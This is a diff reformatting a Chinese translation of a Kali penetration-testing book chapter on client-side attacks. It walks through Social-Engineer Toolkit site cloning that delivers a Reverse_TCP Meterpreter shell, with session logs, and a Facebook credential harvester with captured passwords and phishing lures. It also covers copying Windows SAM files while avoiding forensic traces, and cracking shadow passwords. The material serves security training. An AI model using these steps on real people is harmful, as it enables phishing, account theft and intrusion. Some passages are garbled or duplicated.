+发起成功的社会工程学攻击的良好实践是花时间了解你的目标；学习用户如何交流，并尝试融入他们的环境。大多数失败的社会工程学攻击都是由于以通用的格式编写的，而且它们没有包含吸引受害者的强力钩子 `hook`，就像一封编写糟糕的邮件，声称用户权获得未领取的资金。使用 Facebook 等社交媒体来源是了解目标的绝佳方法，可以了解目标青好的爱好和说话模式。例如，如果一个目标的 Facebook 个人资料布满了运动队标志，那么开发基于折扣运动票的陷阱将是理想的。
 
 由于大多数客户端攻击都利用了社会工程学，下一节将探索 Kali 中常用的社会工程学工具。
 
-## 社会工程学工具包 (SET)
+### 社会工程学工具包 SET
 
-社会工程学工具包 (SET) 由 TrustedSec 的创始人创建并编写。它是一个由 Python 驱动的开源工具，旨在通过社会工程学进行渗透测试。SET 是安全专业人员用于测试组织安全态势的极其流行的工具。现实中的攻击者使用 SET 构建主动和恶意的攻击。它是最常见的社会工程学攻击的首选工具。
+社会工程学工具包 `SET` 由 TrustedSec 的创始人创建并编写。它是一个由 Python 驱动的开源工具，旨在通过社会工程学进行渗透测试。`SET` 是安全专业人员用于测试组织安全态势的极其流行的工具。现实中的攻击者使用 `SET` 构建主动和恶意的攻击。它是最常见的社会工程学攻击的首选工具。
 
-要启动 SET，转到菜单栏 Exploitation Tools（利用工具） | Social Engineering Tools（社会工程学工具），并选择 se-toolkit。
+要启动 `SET`，转到菜单栏 Exploitation Tools 利用工具 | Social Engineering Tools 社会工程学工具，并选择 `se-toolkit`。
 
-当你第一次在 Kali 上启动 SET 时，SET 将直接从 GitHub 显示 SET 分发版更新。你将获得接收更新的选项。当你第一次在 Kali 上启动 SET 时，SET 将直接从 GitHub 显示 SET 分发版更新。你将获得接收更新的选项。选择 yes 接收更新。
+当你第一次在 Kali 上启动 `SET` 时，`SET` 将直接从 GitHub 显示 `SET` 分发版更新。你将获得接收更新的选项。当你第一次在 Kali 上启动 `SET` 时，`SET` 将直接从 GitHub 显示 `SET` 分发版更新。你将获得接收更新的选项。选择 `yes` 接收更新。
 
-## 第4章 
+### 第4章
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_148_0.png)
 
-重要通知！社会工程学工具包对 Kali 和 FSH (Linux) 的目录结构进行了重大更改。
+重要通知！社会工程学工具包对 Kali 和 FSH Linux 的目录结构进行了重大更改。
 
-所有 SET 动态信息现在将保存在 ~/.set目录中，而不是 src/program_junk。
+所有 `SET` 动态信息现在将保存在 `~/.set` 目录中，而不是 `src/program_junk`。
 
-[I] 请注意，以后你应该使用 se-toolkit。
-[I] 通过输入 'set' 启动 SET 将消失...
-[I] 如果在 Kali 上，可以在任何地方输入 'se-toolkit'...
-[I] 如果不在 Kali 上，运行 python setup.py 然后你就可以任何地方使用 se-toolkit..
+`[I]` 请注意，以后你应该使用 `se-toolkit`。
 
-按 {return} 继续进入 SET。
-```
+`[I]` 通过输入 '`set`' 启动 `SET` 将消失...
 
-## 使用 SET 进行克隆和攻击
+`[I]` 如果在 Kali 上，可以在任何地方输入 '`se-toolkit`'...
+
+`[I]` 如果不在 Kali 上，运行 `python setup.py` 然后你就可以任何地方使用 `se-toolkit`..
+
+按 `{return}` 继续进入 `SET`。
+
+
+
+# 使用 SET 进行克隆和攻击
 
 现在你已经理解了 SET 工作的基本原理，让我们使用他们可能信任的网站来攻破客户端。虽然我们可以使用任何网站，但我们建议使用简单的网站。
 
@@ -2605,11 +2539,9 @@ root@kali:~# tail -n 50 -f sslstrip.log
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_149_0.png)
 
+下一步是通过进入 Exploitation Tools | Social Engineering Toolkit | `se-toolkit` 来启动 SET。
 
-
-下一步是通过进入 Exploitation Tools | Social Engineering Toolkit | se-toolkit 来启动 SET。
-
-一旦你接受了所有的许可协议和和服务条款，你将看到 SET 的主界面。
+一旦你接受了所有的许可协议和服务条款，你将看到 SET 的主界面。
 
 ```
 The Social-Engineer Toolkit (SET)
@@ -2623,7 +2555,7 @@ Homepage: https://www.trustedsec.com
 
 欢迎使用社会工程工具包 (SET)。这是满足你所有社会工程需求的一站式服务。
 
-在 irc.freinode.net 的 #setoolkit 频道加入我们。
+在 `irc.freinode.net` 的 `#setoolkit` 频道加入我们。
 
 社会工程工具包是 TrustedSec 的产品。
 访问：https://www.trustedsec.com
@@ -2645,13 +2577,16 @@ set > 1
 
 ## 客户端攻击
 
-建议在运行 SET 之前选择 **5) 更新社会工程工具包** 选项。更新后，选择 **1) 社会工程攻击**。下一张截图显示了 SET 中 **社会工程攻击** 下可用的不同网站攻击向量。鱼叉式钓鱼攻击是一种流行的攻击方式，能够将攻击嵌入到电子邮件和 PDF 中。鱼叉式钓鱼攻击会通过 SET 直接从受害者处处发出的伪造电子邮件发送攻击文件。
+建议在运行 SET 之前选择 **5) 更新社会工程工具包** 选项。更新后，选择 **1) 社会工程攻击**。下一张截图显示了 SET 中 **社会工程攻击** 下可用的不同网站攻击向量。鱼叉式钓鱼攻击是一种流行的攻击方式，能够将攻击嵌入到电子邮件和 PDF 中。鱼叉式钓鱼攻击会通过 SET 直接从受害者处发出的伪造电子邮件发送攻击文件。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_151_0.png)
 
 欢迎使用社会工程工具包 (SET)。这是满足你所有社会工程需求的一站式服务。
-在 irc.freinode.net 的 #setoolkit 频道加入我们。
+
+在 `irc.freinode.net` 的 `#setoolkit` 频道加入我们。
+
 **社会工程工具包是 Trustedsec 的产品。**
+
 访问：https://www.trustedsec.com
 
 从菜单中选择：
@@ -2680,7 +2615,10 @@ set> 2_
 - 10) PowerShell 攻击向量
 - 11) 第三方模块
 - 99) 返回菜单。
+
+```
 set> 2
+```
 
 Web攻击模块是一种利用多种基于 Web 的攻击来入侵目标受害者的独特方法。
 
@@ -2692,9 +2630,9 @@ Metasploit 浏览器漏洞利用方法将利用 Metasploit 浏览器漏洞利用
 
 标签替换 (Tabnabbing) 方法允许用户移动到不同的标签页，刷新页面显示不同的内容。
 
-中间人攻击 (Man Left in the Middle) 方法由 Kos 引入并利用 HTTP REFERER。为了注入字段并收集数据，它使用了一个隐藏的不可见网站和一个恶意的 iframe-script src="http://YOURURL/?"。这可能来自广告或链接。
+中间人攻击 (Man Left in the Middle) 方法由 Kos 引入并利用 `HTTP REFERER`。为了注入字段并收集数据，它使用了一个隐藏的不可见网站和一个恶意的 `iframe-script src="http://YOURURL/?"`。这可能来自广告或链接。
 
-网页劫持 (Web-jacking)攻击方法将添加恶意 iframe 和 Back/Jack 团队。该方法利用 iframe 替换，当窗口弹出时阻止合法网站显示，然后用恶意链接替换。如果你觉得速度太慢或太快，可以进行编辑。
+网页劫持 (Web-jacking)攻击方法将添加恶意 `iframe` 和 Back/Jack 团队。该方法利用 `iframe` 替换，当窗口弹出时阻止合法网站显示，然后用恶意链接替换。如果你觉得速度太慢或太快，可以进行编辑。
 
 多攻击方法 (Multi-attack method) 将通过网站攻击菜单添加组合攻击，例如你可以同时利用 Java 攻击、Metasploit 浏览器、凭据收集器和中间人攻击，直到成功。
 
@@ -2713,19 +2651,14 @@ set-webattack[]_>
 
 SET 将询问你是否想使用 SET 自带的现有模板，或者想克隆一个网站。默认模板并不理想，建议克隆如提供的 SharePoint 示例网站。
 
-在下一个屏幕上，SET 将提供用户复制网站的几种选项。在本示例中，我们将使用 site-cloner。选择 site-cloner，SET 将提供一系列问题。这些问题将引导你完成网站克隆并在 Kali 上运行。Site-Cloner 将请求：
+在下一个屏幕上，SET 将提供用户复制网站的几种选项。在本示例中，我们将使用 `site-cloner`。选择 `site-cloner`，SET 将提供一系列问题。这些问题将引导你完成网站克隆并在 Kali 上运行。`Site-Cloner` 将请求：
 
 - NAT/端口转发：此选项往往让人困惑。SET 是在询问受害者是否使用在 Kali 服务器上配置的 IP 地址连接到你的机器。
-
 - 反向连接的 IP 地址/主机名：当你攻击内网之外或互联网时，SET 需要告诉受害者如何连接回 Kali。
 - 想要克隆的 URL：这是你要克隆的网站。
-- 交付漏洞：SET 将使用 Metasploit 框架交付漏洞。最流行的选项是 Reverse_TCP Meterpreter。Reverse_TCP Meterpreter 的原理是让受害者运行一个执行文件，为攻击者通过 shell 访问开启一个端口。
+- 交付漏洞：SET 将使用 Metasploit 框架交付漏洞。最流行的选项是 `Reverse_TCP Meterpreter`。`Reverse_TCP Meterpreter` 的原理是让受害者运行一个执行文件，为攻击者通过 shell 访问开启一个端口。
 
 ## 客户端攻击
-
-
-
-
 
 ## 第 4 章
 
@@ -2746,32 +2679,38 @@ SET 将询问你是否想使用 SET 自带的现有模板，或者想克隆一�
 16) Inject Shellcode 内存注入
 17) MultiByInjector Shellcode 内存注入
 18) 导入自己的可执行文件
-
 set PAYLOAD>
-选择以下其中一个，“通常带有后门的可执行文件”（backdoored executable）是最佳选择。然而，大多数仍然仍被杀毒软件（av）检测，我们需要进行额外的打包/复制以绕过基础检测。
-1) win_x8 (普通)
-2) shikata_gaai (非常优秀)
-3) alpha_mixed (普通)
-4) alpha_upper (普通)
-5) call_dward_xor (普通)
-6) con_square (普通)
-7) frstenv_mov (普通)
-8) imh_ata_nai (普通)
-9) nonalpha (普通)
-10) 编码 (普通)
-11) unicode_mixed (普通)
-12) unicode_generic (普通)
-13) alphaz (普通)
-14) alphag (普通)
-15) 多重编码 (优秀)
-16) 带后门的可执行文件 (最佳)
+```
 
+选择以下其中一个，“通常带有后门的可执行文件”（backdoored executable）是最佳选择。然而，大多数仍然会被杀毒软件（av）检测，我们需要进行额外的打包/复制以绕过基础检测。
+
+- 1) `win_x8` (普通)
+- 2) `shikata_gaai` (非常优秀)
+- 3) `alpha_mixed` (普通)
+- 4) `alpha_upper` (普通)
+- 5) `call_dward_xor` (普通)
+- 6) `con_square` (普通)
+- 7) `frstenv_mov` (普通)
+- 8) `imh_ata_nai` (普通)
+- 9) `nonalpha` (普通)
+- 10) 编码 (普通)
+- 11) `unicode_mixed` (普通)
+
+
+
+- 12) `unicode_generic`（普通）
+- 13) `alphaz`（普通）
+- 14) `alphag`（普通）
+- 15) 多重编码（优秀）
+- 16) 带后门的可执行文件（最佳）
+
+```
 set encoding=x86
 ```
 
 SET 将询问应该使用哪种监听器。在大多数情况下，请使用默认端口。在回答最后一个问题后，SET 将调出克隆的网站。
 
-这个新的克隆网站可以用来攻击目标。欺骗用户使用 浏览器访问该克隆网站。访问克隆网站将弹出一个 Java 弹出窗口，如果运行了该程序，它将为你的 Kali 服务器提供一个 Reverse_TCP Meterpreter。攻击者可以启动一个 meterpreter 会话，并对访问克隆网站的设备拥有完全管理员权限。
+这个新的克隆网站可以用来攻击目标。欺骗用户使用 浏览器访问该克隆网站。访问克隆网站将弹出一个 Java 弹出窗口，如果运行了该程序，它将为你的 Kali 服务器提供一个 Reverse_TCP Meterpreter。攻击者可以启动一个 `meterpreter` 会话，并对访问克隆网站的设备拥有完全管理员权限。
 
 ## 客户端攻击
 
@@ -2779,6 +2718,7 @@ SET 将询问应该使用哪种监听器。在大多数情况下，请使用默�
 
 当终端用户从克隆网站运行 Java Applet 时，Kali 服务器将连接到受害机机器，如下方的截图所示：
 
+```
 | Meterpreter 会话 1 打开 (10.25.27.200:443) -> 10.62.3.137:5500 |
 | 正在向 10.62.3.137:49401 发送阶段 (75218 bytes) 于 2013-05-04 19:43:51 -0500 |
 | 正在向 10.62.3.137:5500 发送阶段 (75218 bytes) |
@@ -2789,35 +2729,53 @@ SET 将询问应该使用哪种监听器。在大多数情况下，请使用默�
 | Meterpreter 会话 4 打开 (10.25.27.200:221) -> 10.62.3.137:49406) 于 2013-05-04 19:43:54 -0500 |
 | 正在向 10.62.3.137:5500 发送阶段 (75218 bytes) |
 | Meterpreter 会话 6 打开 (10.25.27.200:533) -> 10.62.3.137:49407) 于 2013-05-04 19:43:55 -0500 |
+```
 
-下一个示例是一个截图，显示 SET 可以与 meterpreter 交互并直接向受害者下命令：
+下一个示例是一个截图，显示 SET 可以与 `meterpreter` 交互并直接向受害者下命令：
 
 ```
 ms exploit(handler) > sessions -i 1
+
 [+] 开始与 1 交互...
+
 meterpreter > ifconfig
+
 Interface 1
+
 ===========================
+
 Name            : Software Loopback Interface
+
 Hardware MAC    : 00:00:00:00:00:00
+
 MTU             : 1500
+
 IPv4 Address      : 127.0.0.1
+
 IPv4 Network     : 255.255.255.0
+
 Interface 2
+
 ===========================
+
 Name            : eth0
+
 Hardware MAC    : 08:00:27:c9:d2:a3
+
 MTU             : 1500
+
 IPv4 Address      : 10.62.3.137
+
 IPv4 Network     : 255.255.255.0
+
 meterpreter >
 ```
 
-你可以与 meterpreter 建立多个会话。在例例中，我们使用了命令 `sessions -i 1`。本质上，我们正在做的是与第一个会话进行交互。如果我们有多个主机，我们可以有多个会话，与它们交互，在它们之间切换，或者单独关闭它们。
+你可以与 `meterpreter` 建立多个会话。在例例中，我们使用了命令 `sessions -i 1`。本质上，我们正在做的是与第一个会话进行交互。如果我们有多个主机，我们可以有多个会话，与它们交互，在它们之间切换，或者单独关闭它们。
 
 现在我们已经学习了一些使用 SET 的基础知识，让我们再看另一个例子。我们将查看为了窃取密码而克隆网站。这次当我们进入攻击阶段时，我们将选择凭据收集器（credential harvester）。社会工程攻击（Social Engineering Attacks）、网站攻击（Website Attack），然后是凭据收集器（Credential Harvester）。
 
-Webjacking 方法是通过网络钓鱼引入的。该方法利用 iframe 替换使链接在被点击时弹出一个窗口，然后被恶意链接替换。多重攻击（Multi Attack）方法将通过网络菜单添加组合攻击。例如，你可以使用 Java Applet、Metploit Browser，然后一次性执行它们，这将是成功的。
+Webjacking 方法是通过网络钓鱼引入的。该方法利用 `iframe` 替换使链接在被点击时弹出一个窗口，然后被恶意链接替换。多重攻击（Multi Attack）方法将通过网络菜单添加组合攻击。例如，你可以使用 Java Applet、Metploit Browser，然后一次性执行它们，这将是成功的。
 
 - 1) Java 方法
 - 2) Metploit Browser
@@ -2827,12 +2785,13 @@ Webjacking 方法是通过网络钓鱼引入的。该方法利用 iframe 替换�
 - 6) 多重攻击
 - 7) 导入
 
-##客户端攻击
+## 客户端攻击
 
 客户端机器将看到一个简单的 Java 弹出消息，看起来很正常，普通用户应该不会察觉，如下方的截图所示：
 
 当终端用户从克隆网站运行 Java Applet 时，Kali 服务器将连接到受害机机器，如下方的截图所示：
 
+```
 | Meterpreter session 1 opened (10.25.27.200:443) -> 10.62.3.137:5500 |
 | sending stage (75218 bytes) to 10.62.3.137:49401) at 2013-05-04 19:43:51 -0500 |
 | sending stage (75218 bytes) to 10.62.3.137:5500 |
@@ -2843,30 +2802,40 @@ Webjacking 方法是通过网络钓鱼引入的。该方法利用 iframe 替换�
 | Meterpreter session 4 opened (10.25.27.200:221) -> 10.62.3.137:49406) at 2013-05-04 19:43:54 -0500 |
 | sending stage (75218 bytes) to 10.62.3.137:5500 |
 | Meterpreter session 6 opened (10.25.27.200:533) -> 10.62.3.137:49407) at 2013-05-04 19:43:55 -0500 |
+```
 
 凭据收集器（credential harvester）允许你利用克隆能力从网站中收集凭据或参数。
 - 此选项用于指定服务器 POST 的 IP。
-- 如果你正在使用外部 IP，请在此标签处使用你的外部 IP：10.0.0.255 作为 Harvester/T 的回。
-- SET 支持 HTTP 和 HTTPS。例如：https://thisisafakesite.com
-* 输入克隆 URL：https://www.facebook
-* 克隆网站：https://login.facebook/login.php
-* 如果有用户名和密码字段，这可能需要一点时间。无论如何，这将捕获网站上所有的 POST。
-* 社会工程工具包凭据收集器攻击
-* 凭据收集器运行在端口 80
-* 信息将在到达时显示在下方：
+- 如果你正在使用外部 IP，请在此标签处使用你的外部 IP：`10.0.0.255` 作为 Harvester/T 的回。
+- SET 支持 HTTP 和 HTTPS。例如：`https://thisisafakesite.com`
+- 输入克隆 URL：`https://www.facebook`
+- 克隆网站：`https://login.facebook/login.php`
+- 如果有用户名和密码字段，这可能需要一点时间。无论如何，这将捕获网站上所有的 POST。
+- 社会工程工具包凭据收集器攻击
+- 凭据收集器运行在端口 80
+- 信息将在到达时显示在下方：
 
 ```
 set:webattack>=
-第一种方法将允许 SET 导入预定义的网络应用程序。
-第二种方法将完全克隆你选择的网站并允许你利用攻击。
-第三种方法允许你导入自己的网站，注意在使用导入方法时需要 index.html
-1) Web模板
-2) 站点克隆
-3) 自定义导入
-99) 返回 Webattack 菜单
 ```
 
-我们将选择 2) 站点克隆。将被要求输入 URL。我们将克隆 https://www.facebook.com。
+第一种方法将允许 SET 导入预定义的网络应用程序。
+
+第二种方法将完全克隆你选择的网站并允许你利用攻击。
+
+第三种方法允许你导入自己的网站，注意在使用导入方法时需要 `index.html`
+
+1) Web模板
+
+2) 站点克隆
+
+3) 自定义导入
+
+99) 返回 Webattack 菜单
+
+
+
+我们将选择 2) 站点克隆。将被要求输入 URL。我们将克隆 `https://www.facebook.com`。
 
 注意我们正在输入精确的 URL 并指定使用 HTTPS 还是 HTTP URL。在大多数情况下，这没有区别，因为我们不托管安全网站，但在某些情况下 HTTP 网站可能与 HTTPS 网站不同。
 
@@ -2876,13 +2845,9 @@ set:webattack>=
 
 - 凭据收集器允许你利用克隆功能从网站处收集凭据或参数。
 - 此选项用于指定服务器 POST 的 IP。
-- 如果你正在使用外部 IP，请在此标签处使用你的外部 IP：10.0.0.255 作为 Harvester/T 的回。
+- 如果你正在使用外部 IP，请在此标签处使用你的外部 IP：`10.0.0.255` 作为 Harvester/T 的回。
 
-下一步是引导用户访问虚假网站。实现这一点的常用方法是发送电子邮件，也称为网络钓鱼电子邮件。SET 可以为你自动化此操作，但在本例中，我们决定手动执行。下一个示例显示了使用我们克隆的 Facebook 链接的假电子邮件。当用户点击 www.facebook.com 上的链接时，他们将被引导到我们的假网站 facebook.secmob.net。
-
-
-
-
+下一步是引导用户访问虚假网站。实现这一点的常用方法是发送电子邮件，也称为网络钓鱼电子邮件。SET 可以为你自动化此操作，但在本例中，我们决定手动执行。下一个示例显示了使用我们克隆的 Facebook 链接的假电子邮件。当用户点击 `www.facebook.com` 上的链接时，他们将被引导到我们的假网站 `facebook.secmob.net`。
 
 ## 客户端攻击
 
@@ -2894,11 +2859,17 @@ set:webattack>=
 
 ```
 $! 我们抓到了目标！正在打印输出：
+
 PARAM: UserName=Ladi
+
 POSSIBLE PASSWORD FIELD FOUND: UserPassword=ILoveToDance
+
 PARAM: target=62
+
 PARAM: Log+on.x=59
+
 PARAM: Log+on.y=10
+
 *] 完成后，按下 CTRL-C 生成报告。
 ```
 
@@ -2921,7 +2892,7 @@ PARAM: Log+on.y=10
 
 MitM Proxy 是渗透测试人员用于检查客户端漏洞的绝佳工具。它允许管理员检查 HTTPS 连接、暂停、检查并响应流量。MitM Proxy 允许管理员修改来自 Web 服务器的请求或响应。
 
-MitM Proxy 允许渗透测试人员快速检查攻击，并看到来自浏览器的请求和响应。可以通过进入 Kali | Sniffing/Spoofing | Web Sniffers 并选择 mitmproxy 来启动 MitM Proxy。
+MitM Proxy 允许渗透测试人员快速检查攻击，并看到来自浏览器的请求和响应。可以通过进入 Kali | Sniffing/Spoofing | Web Sniffers 并选择 `mitmproxy` 来启动 MitM Proxy。
 
 [ 143 ]
 
@@ -2931,54 +2902,64 @@ MitM Proxy 允许渗透测试人员快速检查攻击，并看到来自浏览器
 
 ```
 GET https://github.com
+
 -- 200 OK text/html 5.52kb
+
 GET https://a268.a.akam.net/github.com/stylesheets/bundles/github2-24f59e3ded11f2a
+
 -- 1cf7e9e73082bdd50fcf8b.css
+
 -- 200 28.2kb
+
 GET https://a268.a.akam.net/github.com/images/modules/header/logov74x-hover.png71
+
 -- 200 image/png 6.0kb
+
 GET https://a268.a.akam.net/github.com/javascript/bundles/jquery-b2ca07cb3c90cec055d88b1a30bcc2452596.js
+
 -- 200 application/x-javascript 32.9kb
+
 GET https://a268.a.akam.net/github.com/stylesheets/bundles/github-cb564c47c51a1a4
+
 -- 200 text/css 37.09kb
+
 GET https://a268.a.akam.net/github.com/images/modules/home/logos/facebook.png?713452695
+
 -- 200 image/png 5.55kb
 ```
 
+
+
+# 第4章 客户端攻击
+
 将有一份通过客户端的所有活动日志。虽然 MitM Proxy 不在典型的 Web 渗透测试中作为活动组件使用，但在于真实环境中使用该包之前设置和测试 SET 时，它是非常有用的工具。在后面的章节中，我们将检查其他类型的代理；然而，我们喜欢 MitM Proxy 的原因是，作为一个渗透测试人员，通过直接连接到你的 Kali Linux 机器，它是测试攻击的一种简便方法。
 
-### 主机扫描
+## 主机扫描
 
 访问主机系统的常用方法是识别并利用操作系统、已安装应用程序和其他程序中的漏洞。如 Nessus 等工具是评估系统漏洞的自动化方法。本节将介绍如何针对目标系统安装和运行 Nessus。利用将在第 3 章“服务器端攻击”中介绍，可用于利用 Nessus 识别出的漏洞。
 
 ### 使用 Nessus 进行主机扫描
 
-Nessus 并没有随 Kali 预装。你将需要识别并利用操作系统、已安装应用程序和其他程序中的漏洞。Nessus 并没有随 Kali 预装。你需要针对目标系统运行 Nessus。免费版 仅供个人使用，商业用途需要购买授权。
+Nessus 并没有随 Kali 预装。你需要针对目标系统运行 Nessus。免费版仅供个人使用，商业用途需要购买授权。
 
 ### 在 Kali 上安装 Nessus
 
-Nessus 并没有随 Kali 预装。你将需要识别并利用操作系统、已安装应用程序和其他程序中的漏洞。Nessus 并没有随 Kali 预装。你需要将你的扫描器注册到插件库，我们将下载它。Nessus 并没有随 Kali 预装。你需要针对目标系统安装和运行 Nessus。
+Nessus 并没有随 Kali 预装。你需要将你的扫描器注册到插件库，我们将下载它。你需要针对目标系统安装和运行 Nessus。
 
-- 1. 下载 Nessus。
-- 2. 下载 Nessus 后，执行以下命令：
-- 3. 将 /tmp/opt/nessus 复制到 /opt 目录；如果它不存在，请创建 /opt。
-- 4. 你可以删除 /tmp 中的 Nessus 下载内容。
-- 5. 为了启动 Nessus，执行命令：
-- 6. 登录 Nessus 管理界面。
+1. 下载 Nessus。
+2. 下载 Nessus 后，执行以下命令：
+3. 将 `/tmp/opt/nessus` 复制到 `/opt` 目录；如果它不存在，请创建 `/opt`。
+4. 你可以删除 `/tmp` 中的 Nessus 下载内容。
+5. 为了启动 Nessus，执行命令：
+6. 登录 Nessus 管理界面。
 
 ### 使用 Nessus
 
 当你第一次登录 Nessus 时，会看到一些欢迎消息，并且会弹出一个 SSL 证书提示你正在连接到自签名证书。在一些说明性的屏幕之后，系统会提示输入激活码并下载最新插件。
 
-
-
-
-
-你还将设置一个用户名和密码，用于管理 Nessus 。以下截图显示了设置账户以及提供 Tenable 在注册后通过电子邮件提供的 Nessus 激活码的过程：
+你还将设置一个用户名和密码，用于管理 Nessus。以下截图显示了设置账户以及提供 Tenable 在注册后通过电子邮件提供的 Nessus 激活码的过程：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_164_0.png)
-
-## 客户端攻击
 
 初始下载插件需要一些时间，请耐心等待。
 
@@ -3001,8 +2982,6 @@ Nessus 并没有随 Kali 预装。你将需要识别并利用操作系统、已�
 扫描完成后，可以通过点击 Results（结果）选项卡查看结果。这将为管理员提供一份 Nessus 发现的报告。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_166_2.png)
-
-## 客户端攻击
 
 我们可以像下面的截图所示，检查已完成的扫描以及目前任何活动扫描中收集到的任何结果：
 
@@ -3034,8 +3013,6 @@ Nessus 并没有随 Kali 预装。你将需要识别并利用操作系统、已�
 
 前面的示例显示了一些极其危险的漏洞（别担心，我们已经对系统进行了加固和修复）。所有这些漏洞都可以使用 Metasploit 或攻击工具来利用系统。要利用 Nessus 发现的漏洞，请参阅第3章“服务端攻击”中的 Metasploit。
 
-## 第4章
-
 Nessus 提供导出已识别漏洞详情的。你可以将结果导出为 HTML、CSV、PDF 以及许多其他常见文件类型。要导出结果，进入 Results（结果）部分并选择已完成的扫描。左侧的第三个选项卡提供了导出扫描选项，如两个截图所示：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_168_0.png)
@@ -3056,28 +3033,25 @@ Windows 中常用的哈希是 NTLM。它是一个 128 位哈希。虽然它可�
 
 Windows 是常用的操作系统。微软引入了安全功能。目前的产品比旧版本更安全；但仍然受到攻击。
 
-Windows 将密码存储在 SAM（系统账户管理）注册文件中。例外情况是使用了 Active Directory。Active Directory 是一个独立的认证系统，将密码存储在 LDAP 中。SAM 文件位于 c\<systemroot>\sys32\config。
-
-
-
-
-
-## 客户端攻击
+Windows 将密码存储在 `SAM`（系统账户管理）注册文件中。例外情况是使用了 Active Directory。Active Directory 是一个独立的认证系统，将密码存储在 LDAP 中。`SAM` 文件位于 `c\<systemroot>\sys32\config`。
 
 > 注意，如果你在 Windows 中访问文件，你会修改其 MAC（修改、访问和更改），这是 Windows 记录你出现的方式。为了避免留存取证证据，建议在启动攻击之前复制目标主机系统。
 
 ### 挂载 Windows
 
-有可用的工具可以获取 Windows 的 SAM 和 SYSKEY 文件。获取这些文件的一种方法是挂载目标 Windows 系统，以便其他工具可以在 Microsoft Windows 未运行时访问这些文件。
+有可用的工具可以获取 Windows 的 `SAM` 和 `SYSKEY` 文件。获取这些文件的一种方法是挂载目标 Windows 系统，以便其他工具可以在 Microsoft Windows 未运行时访问这些文件。
 
-第一步是使用 `fdisk -l` 命令识别你的分区。你必须识别 Windows 分区和分区类型。fdisk 输出显示了一个 NTFS 分区，如下：
+第一步是使用 `fdisk -l` 命令识别你的分区。你必须识别 Windows 分区和分区类型。`fdisk` 输出显示了一个 NTFS 分区，如下：
 
-```
+
+
 Device Boot Start Blocks Id System
-/dev/hdb1 1 2432 19535008+ 86 NTFS
-/dev/hdb2 2 2433 2554 979965 82 Linux swap/Solaris
-/dev/hdb3 3 2555 6202 29302560 83 Linux
-```
+
+`/dev/hdb1` 1 2432 19535008+ 86 NTFS
+
+`/dev/hdb2` 2 2433 2554 979965 82 Linux swap/Solaris
+
+`/dev/hdb3` 3 2555 6202 29302560 83 Linux
 
 使用命令 `mkdir /mnt/windows` 创建挂载点。
 
@@ -3085,7 +3059,11 @@ Device Boot Start Blocks Id System
 
 ```
 mount -t <WindowsType> <Windows partition> /mnt/windows
+```
+
+```
 root@kali:~# mkdir /mnt/windows
+
 root@kali:~# mount -t ntfs-3g /dev/hdb1 /mnt/windows
 ```
 
@@ -3095,32 +3073,39 @@ root@kali:~# mount -t ntfs-3g /dev/hdb1 /mnt/windows
 cp SAM SYSTEM /pentest/passwords/AttackDirectory
 ```
 
-有可用的工具可以转储 SAM 文件。PwDump 和 Cain and Abel 只是其中的例子。Kali 提供了 sandump，在本章的密码工具部分已介绍。
+有可用的工具可以转储 SAM 文件。`PwDump` 和 `Cain and Abel` 只是其中的例子。Kali 提供了 `sandump`，在本章的密码工具部分已介绍。
 
 > 注意，你需要恢复 Bootkey 和 SAM 文件。Bootkey 文件用于访问 SAM 文件。访问 SAM 文件的工具将需要 Bootkey 文件。
 
 # 第 4 章
 
-bkreg 和 bkhive 是可以获取 Bootkey 文件的流行工具，如下截图所示：
+`bkreg` 和 `bkhive` 是可以获取 Bootkey 文件的流行工具，如下截图所示：
 
 ```
 root@kali:~# bkhive /win/WINDOWS/system32/config/system key.txt
+
 bkhive 1.1.1 by Objectif Securite
+
 http://www.objectif-securite.ch
+
 original author: ncuomo@studenti.unina.it
 
 Root Key : $$
+
 Default ControlSet: 002
+
 Bootkey: 9e55eb2
 ```
 
+
+
 ### Linux 密码
 
-Linux 主机系统不像 Windows 常见，并且获取 ROOT 权限面临不同的挑战。在启用自动登录时，许多系统可能以明文存储密码，例如用于 Telnet 和 FTP 的 netrc 文件。在大多数攻击中，你想要获取通常存储在 `/etc/passwd` 和 `/etc/shadow` 的 passwd 和 shadow 文件。
+Linux 主机系统不像 Windows 常见，并且获取 ROOT 权限面临不同的挑战。在启用自动登录时，许多系统可能以明文存储密码，例如用于 Telnet 和 FTP 的 `netrc` 文件。在大多数攻击中，你想要获取通常存储在 `/etc/passwd` 和 `/etc/shadow` 的 passwd 和 shadow 文件。
 
-shadow 文件仅对 ROOT 可读，且通常是 MD5 哈希值。shadow 文件比 Windows 的 SAM 文件更难获取。有使用 grub 等引导加载程序获取 shadow 文件的方法。
+`shadow` 文件仅对 ROOT 可读，且通常是 MD5 哈希值。`shadow` 文件比 Windows 的 SAM 文件更难获取。有使用 `grub` 等引导加载程序获取 `shadow` 文件的方法。
 
-破解 Linux 密码与 Windows 等其他系统类似。大多数混合自动破解程序（如 John the Ripper）可以识别哈希类型，并使用正确的字典对 shadow 密码进行暴力破解攻击。
+破解 Linux 密码与 Windows 等其他系统类似。大多数混合自动破解程序（如 `John the Ripper`）可以识别哈希类型，并使用正确的字典对 `shadow` 密码进行暴力破解攻击。
 
 ### Kali 密码破解工具
 
@@ -3128,15 +3113,15 @@ Kali 提供了各种工具来绕过密码安全。密码破解工具可以在“
 
 ## 客户端攻击
 
-> 注意，John the Ripper 命令行和 Hydra 已在第 3 章“服务端攻击”中介绍。
+> 注意，`John the Ripper` 命令行和 `Hydra` 已在第 3 章“服务端攻击”中介绍。
 
 ### Johnny
 
-Johnny 是非常流行的 John the Ripper 密码破解工具的图形界面（GUI）。我们在第 3 章“服务端攻击”中介绍过 John the Ripper 的传统命令行版本。与命令行版本一样，Johnny 拥有多个引擎，允许它破解不同类型的密码，包括加密密码和哈希密码。Johnny 具有自动检测大多数哈希和加密密码的能力，使得渗透测试者的过程变得更容易。攻击者喜欢这个工具，因为它具有高度的可定制性，并且可以通过多种不同的方式配置以加速密码破解。
